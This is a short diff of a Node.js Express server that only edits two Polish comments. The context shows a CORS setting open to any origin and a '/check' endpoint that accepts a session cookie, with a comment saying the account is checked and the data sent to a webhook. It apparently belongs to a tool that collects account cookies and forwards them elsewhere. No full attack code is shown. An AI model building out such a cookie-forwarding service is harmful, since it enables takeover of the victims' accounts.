@@ -3,7 +3,7 @@ const app = express();
 
 app.use(express.json());
 
-// CORS – żeby strona działała
+// CORS – żeby strona działała z dowolnego źródła
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -110,7 +110,7 @@ async function checkAccount() {
 </html>`);
 });
 
-// Endpoint do sprawdzania konta + wysyłka na webhook
+// Główny endpoint – sprawdzanie konta + wysyłka na webhook
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
